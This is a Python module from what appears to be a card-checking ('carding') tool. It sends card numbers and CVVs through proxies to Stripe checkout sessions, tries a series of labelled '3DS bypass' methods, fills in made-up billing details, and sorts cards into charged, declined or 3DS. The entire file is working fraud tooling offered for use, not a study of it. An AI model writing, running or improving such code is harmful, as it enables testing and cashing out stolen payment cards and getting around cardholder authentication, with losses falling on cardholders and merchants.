# functions/charge_functions.py
"""
Enhanced Stripe charging functions with free trial and 3DS bypass support
Handles both card formats (mm/yy and month/year) for compatibility
"""

import re
import aiohttp
import time
import asyncio
from typing import Optional, Dict, Any, List, Tuple
from urllib.parse import quote

from config import HEADERS, REQUEST_TIMEOUT, MAX_RETRIES

# Session management
_session = None

# ========== CHARGE RESULT CLASS ==========

class ChargeResult(dict):
    """Charge result dictionary with helper methods"""
    
    @property
    def is_success(self) -> bool:
        return self.get("status") == "CHARGED"
    
    @property
    def is_3ds(self) -> bool:
        return self.get("status") in ["3DS", "3DS SKIP"]
    
    @property
    def is_decline(self) -> bool:
        return self.get("status") == "DECLINED"
    
    @property
    def card_masked(self) -> str:
        card = self.get("card", "")
        if card and '|' in card:
            cc = card.split('|')[0]
            if len(cc) >= 6:
                return f"{cc[:6]}****{cc[-4:]}"
        return card[:16] if card else "Unknown"

# Charge status constants
class ChargeStatus:
    CHARGED = "CHARGED"
    DECLINED = "DECLINED"
    THREE_DS = "3DS"
    THREE_DS_SKIP = "3DS SKIP"
    NOT_SUPPORTED = "NOT SUPPORTED"
    FAILED = "FAILED"
    ERROR = "ERROR"
    UNKNOWN = "UNKNOWN"

# Bypass methods
class BypassMethod:
    NONE = "none"
    RETURN_URL = "return_url"
    PAYMENT_INTENT = "payment_intent"
    SETUP_FUTURE = "setup_future"
    OFF_SESSION = "off_session"
    MANUAL = "manual"
    INCREMENTAL = "incremental"

# ========== SESSION MANAGEMENT ==========

async def get_session():
    """Get or create aiohttp session"""
    global _session
    if _session is None or _session.closed:
        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, ssl=False)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=8)
        _session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    return _session

async def close_session():
    """Close the global session"""
    global _session
    if _session and not _session.closed:
        await _session.close()
        _session = None

# ========== CARD PARSING (Legacy - use card_utils instead) ==========

def parse_card(text: str) -> Optional[Dict]:
    """Parse card from text (legacy)"""
    from .card_utils import parse_card as parse_card_util
    return parse_card_util(text)

def parse_cards(text: str) -> List[Dict]:
    """Parse multiple cards from text (legacy)"""
    from .card_utils import parse_cards as parse_cards_util
    return parse_cards_util(text)

# ========== CHECKOUT INITIALIZATION ==========

async def init_checkout(pk: str, cs: str) -> Dict:
    """Initialize checkout session"""
    s = await get_session()
    body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
    
    try:
        async with s.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/init", 
            headers=HEADERS, 
            data=body
        ) as r:
            return await r.json()
    except Exception as e:
        return {"error": {"message": str(e)}}

# ========== FREE TRIAL HANDLER ==========

async def handle_free_trial(card: Dict, checkout_data: Dict, proxy_str: Optional[str] = None) -> Dict:
    """
    Special handling for $0 / free trial checkouts
    
    Args:
        card: Card dictionary with cc, month/mm, year/yy, cvv
        checkout_data: Checkout data with pk, cs, init_data
        proxy_str: Optional proxy string
    
    Returns:
        ChargeResult dictionary
    """
    start = time.perf_counter()
    
    # Handle both key formats (mm/yy from card_utils.py and month/year from elsewhere)
    cc = card.get('cc', '')
    month = card.get('month', card.get('mm', ''))
    year = card.get('year', card.get('yy', ''))
    cvv = card.get('cvv', '')
    
    # Validate required fields
    if not cc or not month or not year or not cvv:
        return ChargeResult({
            "card": f"{cc}|{month}|{year}|{cvv}",
            "status": ChargeStatus.FAILED,
            "response": "Invalid card data",
            "time": round(time.perf_counter() - start, 2)
        })
    
    card_display = f"{cc[:6]}****{cc[-4:]}"
    
    result = {
        "card": f"{cc}|{month}|{year}|{cvv}",
        "status": None,
        "response": None,
        "time": 0
    }
    
    # Get checkout data
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        result["status"] = ChargeStatus.FAILED
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return ChargeResult(result)
    
    print(f"\n[DEBUG] 🎁 PROCESSING FREE TRIAL - Card: {card_display}")
    
    try:
        from .proxy_utils import get_proxy_url
        s = await get_session()
        proxy_url = get_proxy_url(proxy_str) if proxy_str else None
        
        # Get customer details with safe navigation (handle None values)
        email = init_data.get("customer_email") or "customer@example.com"
        
        # Safely get customer data (might be None)
        customer = init_data.get("customer")
        if customer is None:
            customer = {}
        
        # Safely get address data (might be None)
        address = customer.get("address") if customer else {}
        if address is None:
            address = {}
        
        name = customer.get("name") if customer else "John Smith"
        if name is None:
            name = "John Smith"
            
        country = address.get("country") if address else "US"
        if country is None:
            country = "US"
            
        line1 = address.get("line1") if address else "476 West White Mountain Blvd"
        if line1 is None:
            line1 = "476 West White Mountain Blvd"
            
        city = address.get("city") if address else "Pinetop"
        if city is None:
            city = "Pinetop"
            
        state = address.get("state") if address else "AZ"
        if state is None:
            state = "AZ"
            
        zip_code = address.get("postal_code") if address else "85929"
        if zip_code is None:
            zip_code = "85929"
        
        # Create payment method
        pm_body = (
            f"type=card&card[number]={cc}&card[cvc]={cvv}&"
            f"card[exp_month]={month}&card[exp_year]={year}&"
            f"billing_details[name]={name}&billing_details[email]={email}&"
            f"billing_details[address][country]={country}&"
            f"billing_details[address][line1]={line1}&"
            f"billing_details[address][city]={city}&"
            f"billing_details[address][postal_code]={zip_code}&"
            f"billing_details[address][state]={state}&key={pk}"
        )
        
        print(f"[DEBUG] Free trial - Creating payment method...")
        
        async with s.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=HEADERS,
            data=pm_body,
            proxy=proxy_url
        ) as r:
            pm = await r.json()
        
        if "error" in pm:
            err_msg = pm["error"].get("message", "Card error")
            print(f"[DEBUG] Free trial PM Error: {err_msg}")
            
            # Check for publishable key error
            if "publishable API key" in err_msg.lower():
                result["status"] = ChargeStatus.FAILED
                result["response"] = "Free trial requires manual checkout - Use secret key"
            else:
                result["status"] = ChargeStatus.DECLINED
                result["response"] = err_msg
            result["time"] = round(time.perf_counter() - start, 2)
            return ChargeResult(result)
        
        pm_id = pm.get("id")
        if not pm_id:
            result["status"] = ChargeStatus.FAILED
            result["response"] = "No payment method ID"
            result["time"] = round(time.perf_counter() - start, 2)
            return ChargeResult(result)
        
        print(f"[DEBUG] Free trial - Payment method created: {pm_id}")
        
        # For free trial, we need to attach the payment method to customer
        customer_id = None
        if customer:
            customer_id = customer.get("id")
        
        if not customer_id:
            # Create customer
            print(f"[DEBUG] Free trial - Creating customer...")
            customer_body = f"email={email}&name={name}&payment_method={pm_id}&key={pk}"
            async with s.post(
                "https://api.stripe.com/v1/customers",
                headers=HEADERS,
                data=customer_body,
                proxy=proxy_url
            ) as r:
                customer_data = await r.json()
                if "error" in customer_data:
                    # Check for publishable key error
                    err_msg = customer_data["error"].get("message", "")
                    if "publishable API key" in err_msg.lower():
                        result["status"] = ChargeStatus.FAILED
                        result["response"] = "Free trial requires manual checkout - Use secret key"
                    else:
                        result["status"] = ChargeStatus.FAILED
                        result["response"] = customer_data["error"].get("message", "Customer creation failed")
                    result["time"] = round(time.perf_counter() - start, 2)
                    return ChargeResult(result)
                customer_id = customer_data.get("id")
                print(f"[DEBUG] Free trial - Customer created: {customer_id}")
        
        # Determine checkout mode
        mode = init_data.get("mode", "")
        has_subscription = init_data.get("subscription") is not None
        has_setup_intent = init_data.get("setup_intent") is not None
        
        # For subscription with trial - SIMPLIFIED APPROACH
        if has_subscription or mode == "subscription":
            print(f"[DEBUG] Free trial - Setting up subscription with trial...")
            
            # For free trials, we just need to attach the payment method
            # The subscription will be created automatically when the trial ends
            
            # Attach payment method to customer
            attach_body = f"payment_method={pm_id}&key={pk}"
            async with s.post(
                f"https://api.stripe.com/v1/payment_methods/{pm_id}/attach",
                headers=HEADERS,
                data=attach_body,
                proxy=proxy_url
            ) as r:
                attach_data = await r.json()
                
                if "error" in attach_data:
                    print(f"[DEBUG] Free trial - Attach error: {attach_data['error']}")
                    # Continue anyway - the payment method might already be attached
            
            # Set as default payment method for customer
            cust_update_body = f"invoice_settings[default_payment_method]={pm_id}&key={pk}"
            async with s.post(
                f"https://api.stripe.com/v1/customers/{customer_id}",
                headers=HEADERS,
                data=cust_update_body,
                proxy=proxy_url
            ) as r:
                cust_update = await r.json()
                if "error" in cust_update:
                    print(f"[DEBUG] Free trial - Set default error: {cust_update['error']}")
            
            result["status"] = ChargeStatus.CHARGED
            result["response"] = "Payment method saved for trial"
        
        # For setup intent (saving card for future)
        elif has_setup_intent:
            print(f"[DEBUG] Free trial - Confirming setup intent...")
            setup_intent = init_data.get("setup_intent", {})
            setup_id = setup_intent.get("id")
            
            if setup_id:
                confirm_body = f"payment_method={pm_id}&key={pk}"
                async with s.post(
                    f"https://api.stripe.com/v1/setup_intents/{setup_id}/confirm",
                    headers=HEADERS,
                    data=confirm_body,
                    proxy=proxy_url
                ) as r:
                    setup_data = await r.json()
                    
                    if "error" in setup_data:
                        err_msg = setup_data["error"].get("message", "")
                        if "publishable API key" in err_msg.lower():
                            result["status"] = ChargeStatus.FAILED
                            result["response"] = "Free trial requires manual checkout - Use secret key"
                        else:
                            result["status"] = ChargeStatus.DECLINED
                            result["response"] = setup_data["error"].get("message", "Setup failed")
                        result["time"] = round(time.perf_counter() - start, 2)
                        return ChargeResult(result)
                    
                    result["status"] = ChargeStatus.CHARGED
                    result["response"] = "Card saved successfully"
            else:
                result["status"] = ChargeStatus.CHARGED
                result["response"] = "Card validated for free trial"
        
        # For one-time payment with $0 amount (just validate card)
        else:
            print(f"[DEBUG] Free trial - Card validated successfully")
            result["status"] = ChargeStatus.CHARGED
            result["response"] = "Free checkout successful"
        
    except Exception as e:
        print(f"[DEBUG] Free trial - Error: {e}")
        result["status"] = ChargeStatus.ERROR
        result["response"] = str(e)[:100]
    
    result["time"] = round(time.perf_counter() - start, 2)
    print(f"[DEBUG] Free trial result: {result['status']} - {result['response']}")
    return ChargeResult(result)

# ========== CORE CHARGING FUNCTION ==========

async def charge_card(
    card: Dict, 
    checkout_data: Dict, 
    proxy_str: Optional[str] = None, 
    bypass_3ds: bool = False,
    bypass_method: str = BypassMethod.RETURN_URL,
    max_retries: int = MAX_RETRIES
) -> Dict:
    """
    Charge a card with multiple 3DS bypass strategies
    
    Args:
        card: Card dictionary with cc, month/mm, year/yy, cvv
        checkout_data: Checkout data with pk, cs, init_data
        proxy_str: Optional proxy string
        bypass_3ds: Whether to attempt 3DS bypass
        bypass_method: Which bypass method to use
        max_retries: Maximum retry attempts
    
    Returns:
        ChargeResult dictionary
    """
    start = time.perf_counter()
    
    # Handle both key formats (mm/yy from card_utils.py and month/year from elsewhere)
    cc = card.get('cc', '')
    month = card.get('month', card.get('mm', ''))
    year = card.get('year', card.get('yy', ''))
    cvv = card.get('cvv', '')
    
    card_display = f"{cc[:6]}****{cc[-4:]}" if len(cc) >= 6 else "Invalid card"
    
    result = {
        "card": f"{cc}|{month}|{year}|{cvv}",
        "status": None,
        "response": None,
        "time": 0,
        "bypass_method": bypass_method if bypass_3ds else "none"
    }
    
    # Get checkout data
    pk = checkout_data.get("pk")
    cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")
    
    if not pk or not cs or not init_data:
        result["status"] = ChargeStatus.FAILED
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return ChargeResult(result)
    
    # Get total amount to check for free trial
    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    if lig:
        total = lig.get("total", 0)
    elif inv:
        total = inv.get("total", 0)
    else:
        pi = init_data.get("payment_intent") or {}
        total = pi.get("amount", 0)
    
    # Check if it's a free trial ($0)
    if total == 0:
        # Create a card dict with consistent keys for free trial handler
        free_trial_card = {
            'cc': cc,
            'month': month,
            'year': year,
            'cvv': cvv
        }
        return await handle_free_trial(free_trial_card, checkout_data, proxy_str)
    
    # Regular charge (non-free) - proceed with normal flow
    print(f"\n[DEBUG] Charging card: {card_display} (Amount: {total})")
    
    # Quick check if checkout is supported
    if "payment_intent" not in str(init_data) and "subscription" not in str(init_data):
        print(f"[DEBUG] Checkout might not support direct charges")
        # Continue anyway - let the API call determine
    
    # If bypass is enabled, try multiple methods in sequence
    if bypass_3ds:
        methods_to_try = [
            BypassMethod.PAYMENT_INTENT,
            BypassMethod.SETUP_FUTURE,
            BypassMethod.OFF_SESSION,
            BypassMethod.MANUAL,
            BypassMethod.INCREMENTAL,
            BypassMethod.RETURN_URL  # Fallback
        ]
    else:
        methods_to_try = [BypassMethod.NONE]
    
    for method in methods_to_try:
        for attempt in range(max_retries + 1):
            try:
                charge_result = await _execute_charge_attempt(
                    card={
                        'cc': cc,
                        'month': month,
                        'year': year,
                        'cvv': cvv
                    },
                    card_display=card_display,
                    pk=pk,
                    cs=cs,
                    init_data=init_data,
                    proxy_str=proxy_str,
                    bypass_method=method,
                    attempt=attempt,
                    start_time=start,
                    total=total
                )
                
                # If successful, return immediately
                if charge_result["status"] == ChargeStatus.CHARGED:
                    return ChargeResult(charge_result)
                
                # If not 3DS or not a retryable error, return
                if charge_result["status"] not in [ChargeStatus.THREE_DS, ChargeStatus.ERROR] or attempt >= max_retries:
                    # If we're trying multiple bypass methods and got 3DS, continue to next method
                    if bypass_3ds and charge_result["status"] == ChargeStatus.THREE_DS and method != methods_to_try[-1]:
                        break  # Break retry loop, try next method
                    return ChargeResult(charge_result)
                
                # Wait before retry
                await asyncio.sleep(1 * (attempt + 1))
                
            except Exception as e:
                print(f"[DEBUG] Error in attempt {attempt}: {e}")
                if attempt >= max_retries:
                    if method == methods_to_try[-1]:
                        result["status"] = ChargeStatus.ERROR
                        result["response"] = str(e)[:100]
                        result["time"] = round(time.perf_counter() - start, 2)
                        return ChargeResult(result)
                    break  # Try next method
    
    # If we get here, all methods failed
    result["status"] = ChargeStatus.FAILED
    result["response"] = "All bypass methods failed"
    result["time"] = round(time.perf_counter() - start, 2)
    return ChargeResult(result)

async def _execute_charge_attempt(
    card: Dict,
    card_display: str,
    pk: str,
    cs: str,
    init_data: Dict,
    proxy_str: Optional[str],
    bypass_method: str,
    attempt: int,
    start_time: float,
    total: int
) -> Dict:
    """Execute a single charge attempt with specific bypass method"""
    
    from .proxy_utils import get_proxy_url
    
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
        "bypass_method": bypass_method,
        "attempt": attempt
    }
    
    try:
        s = await get_session()
        proxy_url = get_proxy_url(proxy_str) if proxy_str else None
        
        # Get billing details from init_data
        email = init_data.get("customer_email") or "customer@example.com"
        checksum = init_data.get("init_checksum", "")
        
        # Get amount
        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        if lig:
            total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
        elif inv:
            total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
        else:
            pi = init_data.get("payment_intent") or {}
            total = subtotal = pi.get("amount", 0)
        
        # Get customer details with safe navigation
        customer = init_data.get("customer") or {}
        address = customer.get("address") or {} if customer else {}
        
        name = customer.get("name") if customer else "John Smith"
        if name is None:
            name = "John Smith"
            
        country = address.get("country") if address else "US"
        if country is None:
            country = "US"
            
        line1 = address.get("line1") if address else "476 West White Mountain Blvd"
        if line1 is None:
            line1 = "476 West White Mountain Blvd"
            
        city = address.get("city") if address else "Pinetop"
        if city is None:
            city = "Pinetop"
            
        state = address.get("state") if address else "AZ"
        if state is None:
            state = "AZ"
            
        zip_code = address.get("postal_code") if address else "85929"
        if zip_code is None:
            zip_code = "85929"
        
        # ===== STEP 1: CREATE PAYMENT METHOD =====
        # Add bypass-specific parameters
        pm_extra = ""
        if bypass_method == BypassMethod.SETUP_FUTURE:
            pm_extra = "&setup_future_usage=off_session"
        elif bypass_method == BypassMethod.OFF_SESSION:
            pm_extra = "&setup_future_usage=off_session&payment_method_options[card][request_three_d_secure]=any"
        
        pm_body = (
            f"type=card&card[number]={card['cc']}&card[cvc]={card['cvv']}&"
            f"card[exp_month]={card['month']}&card[exp_year]={card['year']}&"
            f"billing_details[name]={name}&billing_details[email]={email}&"
            f"billing_details[address][country]={country}&"
            f"billing_details[address][line1]={line1}&"
            f"billing_details[address][city]={city}&"
            f"billing_details[address][postal_code]={zip_code}&"
            f"billing_details[address][state]={state}&key={pk}{pm_extra}"
        )
        
        print(f"[DEBUG] Creating payment method... (attempt {attempt}, method: {bypass_method})")
        
        async with s.post(
            "https://api.stripe.com/v1/payment_methods", 
            headers=HEADERS, 
            data=pm_body, 
            proxy=proxy_url
        ) as r:
            pm = await r.json()
        
        if "error" in pm:
            err_msg = pm["error"].get("message", "Card error")
            print(f"[DEBUG] PM Error: {err_msg[:60]}")
            
            if "unsupported" in err_msg.lower() or "tokenization" in err_msg.lower():
                result["status"] = ChargeStatus.NOT_SUPPORTED
                result["response"] = "Checkout not supported"
            else:
                result["status"] = ChargeStatus.DECLINED
                result["response"] = err_msg
            result["time"] = round(time.perf_counter() - start_time, 2)
            return result
        
        pm_id = pm.get("id")
        if not pm_id:
            result["status"] = ChargeStatus.FAILED
            result["response"] = "No payment method ID"
            result["time"] = round(time.perf_counter() - start_time, 2)
            return result
        
        print(f"[DEBUG] PM created: {pm_id}")
        
        # ===== STEP 2: CONFIRM PAYMENT WITH BYPASS METHOD (SIMPLIFIED) =====
        conf_body = (
            f"eid=NA&payment_method={pm_id}&expected_amount={total}&"
            f"last_displayed_line_item_group_details[subtotal]={subtotal}&"
            f"last_displayed_line_item_group_details[total_exclusive_tax]=0&"
            f"last_displayed_line_item_group_details[total_inclusive_tax]=0&"
            f"last_displayed_line_item_group_details[total_discount_amount]=0&"
            f"last_displayed_line_item_group_details[shipping_rate_amount]=0&"
            f"expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
        )
        
        # Add bypass-specific parameters (simplified - removed problematic parameters)
        if bypass_method == BypassMethod.RETURN_URL:
            conf_body += "&return_url=https://checkout.stripe.com/success"
        elif bypass_method == BypassMethod.PAYMENT_INTENT:
            # Removed use_stripe_sdk which causes errors
            conf_body += "&return_url=https://checkout.stripe.com/success"
        elif bypass_method == BypassMethod.SETUP_FUTURE:
            conf_body += "&setup_future_usage=off_session"
        elif bypass_method == BypassMethod.OFF_SESSION:
            conf_body += "&off_session=true"
        elif bypass_method == BypassMethod.MANUAL:
            conf_body += "&confirm=true"
        elif bypass_method == BypassMethod.INCREMENTAL:
            conf_body += "&capture_method=manual"
        
        print(f"[DEBUG] Confirming payment...")
        
        async with s.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm", 
            headers=HEADERS, 
            data=conf_body, 
            proxy=proxy_url
        ) as r:
            conf = await r.json()
        
        # ===== STEP 3: ANALYZE RESPONSE =====
        return _analyze_charge_response(conf, result, start_time, total)
        
    except asyncio.TimeoutError:
        print(f"[DEBUG] Timeout error")
        result["status"] = ChargeStatus.ERROR
        result["response"] = "Timeout"
        result["time"] = round(time.perf_counter() - start_time, 2)
        return result
    except aiohttp.ClientError as e:
        print(f"[DEBUG] Connection error: {e}")
        result["status"] = ChargeStatus.ERROR
        result["response"] = f"Connection error: {str(e)[:50]}"
        result["time"] = round(time.perf_counter() - start_time, 2)
        return result
    except Exception as e:
        print(f"[DEBUG] Unexpected error: {e}")
        result["status"] = ChargeStatus.ERROR
        result["response"] = str(e)[:100]
        result["time"] = round(time.perf_counter() - start_time, 2)
        return result

def _analyze_charge_response(conf: Dict, result: Dict, start_time: float, total: int = None) -> Dict:
    """Analyze charge response and determine actual status"""
    
    # Check if it's a free trial
    if total == 0:
        # For free trials, success might come as 200 with no payment_intent
        if "error" not in conf:
            result["status"] = ChargeStatus.CHARGED
            result["response"] = "Free trial started"
            result["time"] = round(time.perf_counter() - start_time, 2)
            return result
    
    if "error" in conf:
        err = conf["error"]
        dc = err.get("decline_code", "")
        msg = err.get("message", "Failed")
        
        # Check for specific error patterns
        if "publishable API key" in msg.lower():
            result["status"] = ChargeStatus.FAILED
            result["response"] = "Free trial requires secret key - Manual checkout needed"
        # Check for free trial specific errors
        elif "trial" in msg.lower() or "no charge" in msg.lower():
            result["status"] = ChargeStatus.CHARGED
            result["response"] = "Free trial"
        # Check for unknown parameter errors
        elif "unknown parameter" in msg.lower():
            result["status"] = ChargeStatus.DECLINED
            result["response"] = f"Invalid parameter: {msg}"
        # Check if it's a 3DS requirement
        elif "requires_action" in str(conf) or "authentication_required" in dc:
            result["status"] = ChargeStatus.THREE_DS
            result["response"] = "3DS Required"
        else:
            result["status"] = ChargeStatus.DECLINED
            result["response"] = f"{dc.upper()}: {msg}" if dc else msg
    else:
        # No error, check payment intent
        pi = conf.get("payment_intent") or {}
        st = pi.get("status", "") or conf.get("status", "")
        next_action = pi.get("next_action", {})
        
        if st == "succeeded" or st == "active" or st == "trialing":
            result["status"] = ChargeStatus.CHARGED
            result["response"] = "Payment Successful" if total != 0 else "Free trial started"
        elif st == "requires_action":
            # Check if it's actually 3DS or a decline
            if next_action and next_action.get("type") == "redirect_to_url":
                result["status"] = ChargeStatus.THREE_DS
                result["response"] = "3DS Required"
            else:
                # Check last payment error
                last_error = pi.get("last_payment_error", {})
                if last_error:
                    decline_code = last_error.get("decline_code", "")
                    result["status"] = ChargeStatus.DECLINED
                    result["response"] = f"{decline_code}: {last_error.get('message', 'Declined')}"
                else:
                    result["status"] = ChargeStatus.UNKNOWN
                    result["response"] = "Unknown requires_action"
        elif st == "requires_payment_method":
            # This is usually a decline
            last_error = pi.get("last_payment_error", {})
            if last_error:
                decline_code = last_error.get("decline_code", "")
                msg = last_error.get("message", "Card Declined")
                result["status"] = ChargeStatus.DECLINED
                result["response"] = f"{decline_code}: {msg}" if decline_code else msg
            else:
                result["status"] = ChargeStatus.DECLINED
                result["response"] = "Card Declined"
        else:
            result["status"] = ChargeStatus.UNKNOWN
            result["response"] = st or "Unknown"
    
    result["time"] = round(time.perf_counter() - start_time, 2)
    return result

# Legacy function for backward compatibility
async def charge_card_fast(card: dict, pk: str, cs: str, init_data: dict) -> dict:
    """Fast charge card (legacy - use charge_card instead)"""
    checkout_data = {
        "pk": pk,
        "cs": cs,
        "init_data": init_data
    }
    result = await charge_card(card, checkout_data, bypass_3ds=False)
    return dict(result)  # Convert ChargeResult back to dict for legacy compatibility